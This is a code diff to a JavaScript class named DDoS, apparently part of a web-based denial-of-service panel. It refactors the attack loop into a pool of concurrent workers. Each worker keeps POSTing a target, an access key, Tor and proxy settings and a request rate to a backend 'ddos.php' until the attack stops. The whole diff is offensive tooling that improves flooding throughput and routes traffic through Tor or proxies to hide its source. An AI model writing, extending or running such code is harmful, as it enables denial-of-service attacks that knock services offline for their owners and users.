@@ -572,9 +572,8 @@ class DDoS {
   this.target = target;
   this.attackType = 'ddos';
 
-  for (let i = 0; i < this.maxThreads; i++) {
-   this.sendDDoSRequest(target);
-  }
+  // Start the attack using a pool of workers
+  this.ddosAttackPool(target, this.maxThreads, this.requestRate);
 
   this.attackTimeout = setTimeout(() => {
    this.stopAttack();
@@ -582,12 +581,24 @@ class DDoS {
   }, this.ATTACK_TIMEOUT);
  }
 
- async sendDDoSRequest(target) {
+ // Function to manage the DDoS attack using a pool of workers
+ async ddosAttackPool(target, numThreads, requestRate) {
+  const promises = [];
+  for (let i = 0; i < numThreads; i++) {
+   promises.push(this.sendDDoSRequest(target, requestRate));
+  }
+
+  // Await all threads to complete or until the attack is stopped
+  await Promise.all(promises);
+ }
+
+ // Modified to receive the request rate per thread
+ async sendDDoSRequest(target, requestRate) {
   if (!this.attackRunning) return;
 
   try {
    const proxy = this.isTorEnabled ? this.TOR_PROXY : this.proxyList.value;
-   const url = `main/ddos.php?target=${encodeURIComponent(target)}&Key=${this.Key}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(proxy)}&rate=${this.requestRate}`;
+   const url = `main/ddos.php?target=${encodeURIComponent(target)}&Key=${this.Key}&tor=${this.isTorEnabled}&proxy=${encodeURIComponent(proxy)}&rate=${requestRate}`;
    const response = await fetch(url, {
     method: 'POST'
    });
@@ -602,7 +613,7 @@ class DDoS {
    this.handleAttackError('DDoS', target, err);
   } finally {
    if (this.attackRunning) {
-    setTimeout(() => this.sendDDoSRequest(target), 1000 / this.requestRate);
+    setTimeout(() => this.sendDDoSRequest(target, requestRate), 1000 / requestRate);
     this.activeThreads = this.maxThreads;
    }
   }
